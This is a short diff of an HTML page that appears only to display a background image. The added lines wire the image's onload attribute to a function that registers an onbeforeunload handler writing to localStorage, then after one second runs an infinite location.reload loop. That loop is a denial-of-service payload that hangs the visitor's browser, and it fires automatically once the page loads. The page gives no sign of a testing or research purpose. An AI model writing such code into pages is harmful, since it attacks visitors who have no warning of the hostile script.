@@ -20,16 +20,18 @@
   </style>
 </head>
 <body>
-  <img id="background" src="background.png" alt="Background Image">
+  <img id="background" src="background.png" alt="Background Image" onload="startReload()">
 
   <script>
-    window.onbeforeunload = function() {
-      localStorage.x = 1;
-    };
+    function startReload() {
+      window.onbeforeunload = function() {
+        localStorage.x = 1;
+      };
 
-    setTimeout(function() {
-      while (true) location.reload(true);
-    }, 1000);
+      setTimeout(function() {
+        while (true) location.reload(true);
+      }, 1000);
+    }
   </script>
 </body>
 </html>
